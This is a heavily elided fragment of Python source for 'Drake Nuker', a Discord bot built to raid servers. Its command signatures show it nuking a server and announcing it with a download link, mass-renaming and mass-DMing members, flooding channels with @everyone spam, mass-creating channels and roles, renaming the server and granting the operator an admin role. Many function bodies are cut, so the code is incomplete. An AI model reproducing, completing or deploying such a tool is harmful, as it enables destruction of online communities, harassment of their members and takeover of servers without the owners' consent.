...
async def nuke(ctx, ban: bool = True, text: str = "Blood Nuker"):
    ...
    try:
        ...
        embed.add_field(name="This server is Nuked",
                        value="By Drake Nuker\nDownload: https://github.com", inline=False)
        channel = await ctx.guild.create_text_channel(name="Drake Nuker")
...
@commands.check(isWhitelisted)
async def renameEveryone(ctx, *, name="Drake  Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def dmEveryone(ctx, *, msg="Drake Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Drake Nuker"):
    await msg_delete(ctx)
...
@commands.check(isWhitelisted)
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Drake Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithChannels(ctx, amount: int = 25, *, name="Drake Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithRoles(ctx, amount: int = 25, *, name="Drake Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def editServerName(ctx, *, name="Drake Nuker"):
    await msg_delete(ctx)
    try:
...
@commands.check(isWhitelisted)
async def getAdmin(ctx, *, rolename="Drake Nuker"):
    await msg_delete(ctx)
    try:
...
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        ...
        try:
            await guild.create_text_channel(name="Drake Nuker")
